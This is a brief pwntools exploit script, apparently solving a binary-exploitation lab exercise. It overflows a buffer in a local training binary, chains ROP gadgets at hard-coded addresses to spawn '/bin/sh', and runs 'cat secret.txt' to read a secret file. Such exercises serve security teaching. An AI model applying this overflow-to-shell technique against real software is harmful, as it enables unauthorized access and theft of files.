#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./gadget-exercise2.bin")
    input("Pause for a while")
    rop = ROP("./gadget-exercise2.bin")
    rdi_gadget = p64(0x4007b3) # You can also write more concisely like this.
    #print(rop.rdi)#pop rdi ret

    print(p.recvuntil("buffer: "))    
    p.send(b"a" * 0x28 + p64(0x400697) + rdi_gadget + p64(0x601080) + p64(0x400676))
    print(p.recvuntil("buffer: "))
    p.send(b"/bin/sh")
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
